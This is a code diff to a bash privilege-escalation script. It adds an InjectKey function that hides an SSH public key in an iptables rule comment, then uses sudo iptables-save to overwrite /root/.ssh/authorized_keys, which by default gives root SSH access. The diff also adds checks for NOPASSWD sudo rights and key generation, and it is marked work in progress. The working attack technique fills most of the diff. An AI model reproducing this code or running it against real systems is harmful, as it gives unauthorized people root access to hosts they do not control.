@@ -24,7 +24,7 @@ Banner()
 }
 lline()
 {
-    echo "========================================================================================================="
+    echo "$bl=========================================================================================================$reset"
 }
 initCheck()
 {
@@ -37,7 +37,7 @@ initCheck()
     elif echo "$initSudo" | grep -q "NOPASSWD: ALL"; then
         echo "$green[+]$reset $USER has NOPASSWD: ALL privilege"
         lline
-        echo "$initSude"
+        echo "$initSudo"
         lline
     fi
     if [[ ! -z "$pubkey" && -f "$pubkey" ]] && [[ "$pubkey" =~ \.pub$ ]]; then
@@ -49,6 +49,14 @@ initCheck()
     else
         echo "$orange[!]$reset Public key: None (Public key must end with .pub)"
     fi
+    if [[ -f "$target" ]]; then
+        echo "$blue[*]$reset Target file: $targetfile"
+    elif [[ -z "$target" ]]; then
+        target="/root/.ssh/authorized_keys"
+        echo "$blue[*]$reset Target file: $target"
+    else
+        echo "$yellow[!]$reset Target file: None"
+    fi
 }
 MakeKey()
 {
@@ -58,6 +66,15 @@ MakeKey()
         ssh-keygen -t ed25519 -b 4096 -f privesc_key
     fi
 }
+InjectKey()
+{
+    payload=$(cat "$pubkey")
+    echo "$yellow[*]$reset Injecting SSH key."
+    sudo iptables -A INPUT -m comment --comment $'\n'"$payload"
+    echo "$yellow[*]$reset Saving iptables to $target"
+    sudo iptables-save -f "$target" || { echo "$red"[!]$reset Failed to write to $target. Exiting.; exit 1; }
+    echo "$green[+]$reset Done!"
+}
 Flush()
 {
     sudo iptables -F
@@ -65,6 +82,7 @@ Flush()
 while [[ $# -gt 0 ]]; do
     case "$1" in
         -k|--key)
+            ispubkey=true
             pubkey="$2"
             shift 2
             ;;
@@ -109,5 +127,14 @@ Banner
 initColors
 if [ "$check" = true ]; then
     initCheck
+fi
+if [ "$makekey" = true ]; then
+    MakeKey
+fi
+if [ "$ispubkey" = true ]; then
+    if [ -z "$pubkey" ] || [ ! -f "$pubkey" ]; then
+        echo "$red[!]$reset No valid public key provided. Exiting."
+        exit 1
+    fi
 fi
 # Work in progress
